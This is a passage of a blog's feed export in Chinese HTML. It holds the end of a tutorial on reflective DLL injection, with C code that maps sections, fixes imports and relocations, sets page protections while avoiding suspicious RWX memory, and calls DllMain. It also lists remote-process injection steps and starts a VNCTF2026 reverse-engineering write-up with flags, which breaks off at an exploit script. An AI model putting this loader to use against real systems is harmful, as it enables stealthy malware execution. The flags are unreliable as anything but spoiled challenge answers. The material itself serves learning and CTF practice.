class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 为节头（section headers）数组分配内存</span></span><br><span class="line">peSections = (PIMAGE_SECTION_HEADER*)custom_malloc((<span class="keyword">sizeof</span>(PIMAGE_SECTION_HEADER) * ImgFileHdr.NumberOfSections), VA);</span><br><span class="line"><span class="keyword">if</span> (peSections == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将节的指针保存到节头数组中</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ImgFileHdr.NumberOfSections; i++) &#123;</span><br><span class="line">    <span class="comment">// 计算每个节头的位置并保存到 peSections 数组中</span></span><br><span class="line">    peSections[i] = (PIMAGE_SECTION_HEADER)(((PBYTE)pImgNtHdrs) + <span class="number">4</span> + <span class="number">20</span> + ImgFileHdr.SizeOfOptionalHeader + (i * IMAGE_SIZEOF_SECTION_HEADER));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将每个节的内容从原始 PE 文件中复制到内存中的相应位置</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ImgFileHdr.NumberOfSections; i++) &#123;</span><br><span class="line">    custom_memcpy(</span><br><span class="line">        <span class="comment">// 目标地址：在内存中的虚拟地址</span></span><br><span class="line">        (PVOID)(pebase + peSections[i]-&gt;VirtualAddress),</span><br><span class="line">        <span class="comment">// 源地址：原始 PE 文件中的偏移地址</span></span><br><span class="line">        (PVOID)(dllBaseAddress + peSections[i]-&gt;PointerToRawData),</span><br><span class="line">        <span class="comment">// 复制的大小</span></span><br><span class="line">        peSections[i]-&gt;SizeOfRawData</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="修复导入表-IAT"><a href="#修复导入表-IAT" class="headerlink" title="修复导入表 IAT"></a>修复导入表 IAT</h2><p>一旦各个节被加载到正确的虚拟地址中，所有的相对虚拟地址（RVA）就开始有意义了。因此，在这里我们可以开始修复导入目录（Import Directory）：遍历我们反射 DLL 需要操作的所有 DLL 列表，导入它们，并根据我们在内存中获得的位置调整每个函数的 RVA。基本上将所有的 RVA 转换为 VA（虚拟地址），即 VA &#x3D; ImageBase + RVA。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; pImgOptHdr-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size; i += <span class="keyword">sizeof</span>(IMAGE_IMPORT_DESCRIPTOR)) &#123;</span><br><span class="line">        <span class="comment">// 获取图像导入描述符的指针</span></span><br><span class="line">        pImgImpDesc = (PIMAGE_IMPORT_DESCRIPTOR)(pebase + pImgOptHdr-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + i);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用自定义的GetModuleHandle/GetProcAddress来导入DLL</span></span><br><span class="line">        dll = LLA((LPSTR)(pebase + pImgImpDesc-&gt;Name));</span><br><span class="line">        <span class="keyword">if</span> (dll == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取ILT和IAT的引用</span></span><br><span class="line">        pOriginalFirstThunk = (PIMAGE_THUNK_DATA64)(pebase + pImgImpDesc-&gt;OriginalFirstThunk);</span><br><span class="line">        pFirstThunk = (PIMAGE_THUNK_DATA64)(pebase + pImgImpDesc-&gt;FirstThunk);</span><br><span class="line">        <span class="comment">// 如果引用不为空</span></span><br><span class="line">        <span class="keyword">while</span> (pOriginalFirstThunk-&gt;u1.Function != <span class="literal">NULL</span> &amp;&amp; pFirstThunk-&gt;u1.Function != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// 检查函数是通过序号引用还是通过名称引用的</span></span><br><span class="line">            <span class="keyword">if</span> (pOriginalFirstThunk-&gt;u1.Ordinal &amp; <span class="number">0x8000000000000000</span>) &#123;</span><br><span class="line">                <span class="comment">// 通过保留低16位来获取序号的字节</span></span><br><span class="line">                ordinal = pOriginalFirstThunk-&gt;u1.Ordinal &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">                <span class="comment">// 获取函数地址</span></span><br><span class="line">                funcAddress = GPARO(dll, (<span class="type">int</span>)ordinal);</span><br><span class="line">                <span class="keyword">if</span> (funcAddress != nullptr)</span><br><span class="line">                    <span class="comment">// 调整IAT表（返回的地址与DllBaseAddress相加）</span></span><br><span class="line">                    pFirstThunk-&gt;u1.Function = (ULONGLONG)funcAddress;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 如果函数可以通过其名称找到</span></span><br><span class="line">                pImgImportByName = (PIMAGE_IMPORT_BY_NAME)(pebase + pOriginalFirstThunk-&gt;u1.AddressOfData);</span><br><span class="line">                funcAddress = GPAR(dll, pImgImportByName-&gt;Name);</span><br><span class="line">                <span class="keyword">if</span> (funcAddress != nullptr)</span><br><span class="line">                    pFirstThunk-&gt;u1.Function = (ULONGLONG)funcAddress;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 移动到下一个</span></span><br><span class="line">            pOriginalFirstThunk++;</span><br><span class="line">            pFirstThunk++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="修复重定位表"><a href="#修复重定位表" class="headerlink" title="修复重定位表"></a>修复重定位表</h2><p>现在，导入地址表也已修复，这意味着如果DLL在该进程的内存中执行，它将知道在哪里找到所需的函数。现在是应用基址重定位的时候了，我们可以简要说明一下重定位的工作原理：当程序被编译时，编译器假定一个特定的基址作为可执行文件的基址。然后基于这个基址计算并嵌入了各种地址。然而，可执行文件加载时不太可能正好加载到这个基址。相反，它可能加载到一个不同的地址，这使得所有这些嵌入的地址无效。为了解决这个加载问题，一个包含所有这些需要调整的嵌入地址的列表被存储在PE文件的一个专门表中，称为重定位表（Relocation Table）。这个表位于.reloc节的一个数据目录中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*--------------修复重定位--------------*/</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// 计算delta，即实际基地址与期望基地址的差值</span></span><br><span class="line"> delta = (ULONG_PTR)pebase - pImgOptHdr-&gt;ImageBase;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 获取重定位表的起始地址</span></span><br><span class="line"> pImgRelocation = (PIMAGE_BASE_RELOCATION)(pebase + pImgOptHdr-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 遍历所有的重定位块</span></span><br><span class="line"> <span class="keyword">while</span> (pImgRelocation-&gt;VirtualAddress) &#123;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 获取第一个重定位条目的地址</span></span><br><span class="line">     pRelocEntry = (PBASE_RELOCATION_ENTRY)(pImgRelocation + <span class="number">1</span>);</span><br><span class="line">     <span class="comment">// 计算重定位条目的数量（移除头部大小并除以每个条目的大小）</span></span><br><span class="line">     entriesCount = (<span class="type">int</span>)((pImgRelocation-&gt;SizeOfBlock - <span class="number">8</span>) / <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 遍历所有的重定位条目</span></span><br><span class="line">     <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; entriesCount; i++) &#123;</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 根据重定位类型进行处理</span></span><br><span class="line">         <span class="keyword">switch</span> (pRelocEntry-&gt;Type) &#123;</span><br><span class="line">         <span class="keyword">case</span> IMAGE_REL_BASED_DIR64:</span><br><span class="line">         &#123;<span class="comment">// 如果类型为IMAGE_REL_BASED_DIR64（即值为10）</span></span><br><span class="line">             <span class="comment">// 对64位字段应用delta值</span></span><br><span class="line">             ULONGLONG* toAdjust = (ULONGLONG*)(pebase + pImgRelocation-&gt;VirtualAddress + pRelocEntry-&gt;Offset);</span><br><span class="line">             *toAdjust += (ULONGLONG)delta;</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">case</span> IMAGE_REL_BASED_HIGHLOW:</span><br><span class="line">             <span class="comment">// 对32位字段应用delta值</span></span><br><span class="line">         &#123;</span><br><span class="line">             DWORD* toAdjust = (DWORD*)(pebase + pImgRelocation-&gt;VirtualAddress + pRelocEntry-&gt;Offset);</span><br><span class="line">             *toAdjust += (DWORD)delta;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> IMAGE_REL_BASED_HIGH:</span><br><span class="line">             <span class="comment">// 对16位高字段应用delta值的高16位</span></span><br><span class="line">         &#123;</span><br><span class="line">             WORD* toAdjust = (WORD*)(pebase + pImgRelocation-&gt;VirtualAddress + pRelocEntry-&gt;Offset);</span><br><span class="line">             *toAdjust += HIWORD(delta);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> IMAGE_REL_BASED_LOW:</span><br><span class="line">             <span class="comment">// 对16位低字段应用delta值的低16位</span></span><br><span class="line">         &#123;</span><br><span class="line">             WORD* toAdjust = (WORD*)(pebase + pImgRelocation-&gt;VirtualAddress + pRelocEntry-&gt;Offset);</span><br><span class="line">             *toAdjust += LOWORD(delta);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> IMAGE_REL_BASED_ABSOLUTE:</span><br><span class="line">             <span class="comment">// 跳过此类型的重定位。该类型可以用来填充块</span></span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">// 移动到下一个重定位条目</span></span><br><span class="line">         pRelocEntry++;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 移动到下一个重定位块</span></span><br><span class="line">     pImgRelocation = (PIMAGE_BASE_RELOCATION)(reinterpret_cast&lt;DWORD_PTR&gt;(pImgRelocation) + pImgRelocation-&gt;SizeOfBlock);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="为每个节分配正确的内存属性"><a href="#为每个节分配正确的内存属性" class="headerlink" title="为每个节分配正确的内存属性"></a>为每个节分配正确的内存属性</h2><p>我们根据IMAGE_SECTION_HEADER 的Characteristics 字段确定每个节的属性然后为其分配即可</p><blockquote><p>反射 DLL 注入本质上是在手动实现 Windows PE Loader 的工作，而 PE Loader 在加载 DLL 时本来就会根据节属性设置精确的页保护，否则程序无法正常运行。</p><p>如果把所有节都设为：PAGE_EXECUTE_READWRITE虽然能跑，但非常可疑</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ImgFileHdr.NumberOfSections; i++) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_WRITE) &#123;<span class="comment">//write</span></span><br><span class="line"></span><br><span class="line">        dwProtection = PAGE_WRITECOPY;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_READ) &#123;<span class="comment">//read</span></span><br><span class="line"></span><br><span class="line">        dwProtection = PAGE_READONLY;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_EXECUTE) &#123;<span class="comment">//exec</span></span><br><span class="line"></span><br><span class="line">        dwProtection = PAGE_EXECUTE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_READ &amp;&amp; peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_WRITE) &#123; <span class="comment">//readwrite</span></span><br><span class="line"></span><br><span class="line">        dwProtection = PAGE_READWRITE;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_EXECUTE &amp;&amp; peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_WRITE) &#123; <span class="comment">//executewrite</span></span><br><span class="line"></span><br><span class="line">        dwProtection = PAGE_EXECUTE_WRITECOPY;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_EXECUTE &amp;&amp; peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_READ) &#123; <span class="comment">//executeread</span></span><br><span class="line"></span><br><span class="line">        dwProtection = PAGE_EXECUTE_READ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_EXECUTE &amp;&amp; peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_READ &amp;&amp; peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_WRITE) &#123; <span class="comment">//executereadwrite</span></span><br><span class="line"></span><br><span class="line">        dwProtection = PAGE_EXECUTE_READWRITE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!VP((PVOID)(pebase + peSections[i]-&gt;VirtualAddress), peSections[i]-&gt;SizeOfRawData, dwProtection, &amp;dwOldProtection)) &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="调用-dll-入口点"><a href="#调用-dll-入口点" class="headerlink" title="调用 dll 入口点"></a>调用 dll 入口点</h2><p>最后我们刷新指令缓存，使得我们先前的工作生效，然后返回入口点地址就可以了，然后就会完成C运行库的初始化，执行一系列安全检查并调用dllmain。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FIC((HANDLE)-1, NULL, 0x00);</span><br><span class="line"></span><br><span class="line">    /*--------------EXECUTE ENTRY POINT--------------*/</span><br><span class="line">    pDllMain = (fnDllMain)(pebase + pImgNtHdrs-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">    return pDllMain((HMODULE)pebase, DLL_PROCESS_ATTACH, NULL);</span><br></pre></td></tr></table></figure><h2 id="ReflectiveInject"><a href="#ReflectiveInject" class="headerlink" title="ReflectiveInject"></a>ReflectiveInject</h2><p>在 inject 里面要做的事情主要有一下几步：</p><ol><li><p><strong>下载&#x2F;读取我们的 DLL 字节</strong></p></li><li><p><strong>查找 ReflectiveFunction 的 RAW 地址</strong></p><p>在DLL文件中找到ReflectiveFunction的原始地址。这通常需要解析DLL的PE结构以定位目标函数的地址。</p><p>反射注入的关键在于：把 DLL 原始字节塞进了远程进程的一块内存里，但<strong>系统并不知道那是个模块</strong>，也不会解析导入表&#x2F;重定位&#x2F;节权限等。</p><p>所以必须先定位一个引导入口函数（常叫 ReflectiveLoader &#x2F; ReflectiveFunction）：</p><ul><li>这个函数的作用不是业务逻辑，而是<strong>在目标进程里把自己加载成一个真正可运行的模块</strong>。</li><li>因为DLL 还没被正常加载，所以没法靠常规方式（比如 GetProcAddress(模块句柄, 函数名)）去找它。</li><li>因此只能从 DLL 文件的 <strong>PE 结构</strong>里定位它在文件中的位置（RAW&#x2F;文件偏移），然后换算成将来写进远程内存后的对应地址。</li></ul><p>可以把它想象成：</p><blockquote><p>把一本书（DLL字节）搬进别人家（远程进程），但书还没拆封（没加载）。得先找到拆封说明书的那一页（ReflectiveLoader），然后让别人从那一页开始读，才能把书摊开用。</p></blockquote></li><li><p><strong>在远程进程中分配内存</strong>：在目标远程进程中分配足够的内存，以容纳即将写入的DLL字节。</p></li><li><p><strong>在远程内存位置写入 RAW 字节</strong>：将下载或读取到的DLL字节写入分配好的远程内存中。</p></li><li><p><strong>创建一个将运行“ReflectiveLoader”函数的远程线程</strong>:在远程进程中创建一个线程，以运行ReflectiveLoader函数，这样DLL就可以在目标进程中进行自我加载。</p><p>在目标进程里，必须有一段代码开始执行，去完成自加载那一整套动作。ReflectiveLoader 就相当于一个<strong>微型PE加载器</strong>，它运行后通常会：</p><ol><li>在目标进程里为“最终映像”再找&#x2F;准备一块合适的内存</li><li>把各节按内存布局重新安放</li><li>修复重定位 + 解析导入</li><li>设置节权限</li><li>调用入口初始化（DLLMain &#x2F; TLS 等）</li><li>然后返回&#x2F;自清理（不同实现不同）</li></ol></li></ol><p><a href="https://xz.aliyun.com/news/12996">PEB及其武器化-先知社区</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Shadow&quot;&gt;&lt;a href=&quot;#Shadow&quot; class=&quot;headerlink&quot; title=&quot;Shadow&quot;&gt;&lt;/a&gt;Shadow&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://tkazer.github.io/2026/02/02/VNCTF2026</summary>
      
    
    
    
    <category term="Re" scheme="http://matriy330.github.io/categories/Re/"/>
    
    
    <category term="Re" scheme="http://matriy330.github.io/tags/Re/"/>
    
  </entry>
  
  <entry>
    <title>VNCTF2026 Re</title>
    <link href="http://matriy330.github.io/21537f75/"/>
    <id>http://matriy330.github.io/21537f75/</id>
    <published>2026-02-23T14:27:32.000Z</published>
    <updated>2026-02-23T14:29:47.559Z</updated>
    
    <content type="html"><![CDATA[<h1 id="VNCTF2026-Re-复现"><a href="#VNCTF2026-Re-复现" class="headerlink" title="VNCTF2026 Re 复现"></a>VNCTF2026 Re 复现</h1><p>做alictf去了 没怎么做 简单看看题</p><h2 id="ez-maze"><a href="#ez-maze" class="headerlink" title="ez_maze"></a>ez_maze</h2><p>难度：签到</p><p>主要是壳上了 exeinfo上看没有壳 die识别出了是个upx 但是010没找到相关特征，应该是魔改了，使用各种脱壳工具无法直接脱壳，需要手脱</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260202113945809.png" alt="image-20260202113945809"></p><p>大致看了下程序首先会jmp到102A，102A会jmp到E9D0</p><p>入口点：ImageBase + 0x31000（也就是 <code>.arch</code> 节）</p><p>.arch开头看起来像乱码，但它先 jmp到 0x3102A，那里是一条jmp rel32，也就是跳到.rdata 内部 RVA 0x1E9D0（这段才是真壳代码）。</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260202140547774.png" alt="image-20260202140547774"></p><blockquote><p>在 RVA 0x1E9D0 这段反汇编非常典型：</p><p>rsi 指向 .rdata 起始（压缩数据流）</p><p>rdi 被设置成 rsi - 0x1B000</p><p>因为 .rdata 起始是 RVA 0x1C000，所以目标地址是：0x1C000 - 0x1B000 &#x3D; RVA 0x1000</p><p>也就是说：把压缩流解压到 RVA 0x1000（原 .text）。</p><p>另外它内部的 bit-buffer 读法是 UPX stub 常见的：add ebx, ebx &#x2F; adc 链式取 bit</p><p>backref copy 用 rdi + rbp 这种负偏移方式</p><p>RVA 是相对于程序加载基址（ImageBase）的地址</p><p><strong>IAT &#x3D; Import Address Table（导入地址表）</strong>相当于API函数地址表</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260202191345163.png" alt="image-20260202191345163"></p><p>F7跟进到如下地址</p><p>可以参考<a href="https://www.cnblogs.com/Meteor-Kai/articles/18473549">upx手动脱壳 - Meteor_Kai - 博客园</a></p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260202194653185.png" alt="image-20260202194653185"></p><p>此处dump+fix (但不知道为什么修完后的无法运行 显示缺少某dll)</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260202195327738.png" alt="image-20260202195327738"></p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260202200229488.png" alt="image-20260202200229488"></p><p>但是字符串却没搜到</p><p>因为现在看到的这个字符串是 <strong>UTF-16LE（宽字符）</strong>，而在 IDA 里 <strong>Shift+F12常用的搜索很多时候只在 ANSI&#x2F;ASCII 结果里找</strong></p><p>然后一个简单迷宫题</p><p>VNCTF{wwaaaaaaaawwwwddwwddwwaaaawwaaaaaassssaawwwwaawwwwwwwa}</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260202201938881.png" alt="image-20260202201938881"></p><h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><p>前端有</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260202210109039.png" alt="image-20260202210109039"></p><p>JNI 注册表在 JNI_OnLoad 里：</p><ul><li>encrypt：sub_25F8C</li><li>sign： sub_26408  setKey（Java_com_britney_login_util_NativeBridge_setKey 0x26770）：byte_621A0[i] &#x3D; key[i]，拷贝 key 的前 16 字节作为 AES key</li></ul><p>encrypt（sub_25F8C）：</p><ol><li><p>取 android_id &#x3D; Settings.Secure.getString(…, “android_id”)</p></li><li><p>拼串：plain &#x3D; f”{payload}:{android_id}”</p><p>自定义填充：j1 &#x3D; (16 - (len(plain) &amp; 0xF)) &amp; 0xF</p><p>追加 0x01 * j1</p><p>再写一个 0x00 终止符，但 长度返回的是 len(plain)+j1（不包含 0x00）</p></li><li><p>AES-128-ECB（key &#x3D; byte_621A0）</p></li><li><p>自定义 Base64 字母表：RSTUVWLbcdefghiMNOPrstuvQXYZajCklmnEFGHIJKwxyz01ABD234opq56789+&#x2F;</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260202210248147.png" alt="image-20260202210248147"></p><p>sign:sub_26408</p><ol><li>同样拿 android_id</li><li>三个字节 byte_621B0..2 都是 0xFF（&amp;1 后都是 1）</li><li>生成字符串：VNCTF:{payload}:{android_id}:{encrypted}:1:1:1</li><li>md5 -&gt; hex</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260202210909152.png" alt="image-20260202210909152"></p><p>流量包里可以看</p><p>&#x2F;getkey 响应（frame 12）：MnpiiylSrRk_mZ-H</p><p>里面有个假flag VNCTF{test!!test!!!test!!!}</p><p>意思是从pacp泄露的username和password然后生成了个sign去请求login接口</p><p>pcap 里是当时内网 192.168.1.5:8080 的 key：MnpiiylSrRk_mZ-H</p><p>但现在真正可用的是远程 114.66.24.228:34014，它的 &#x2F;getkey 会返回新的 key：</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span 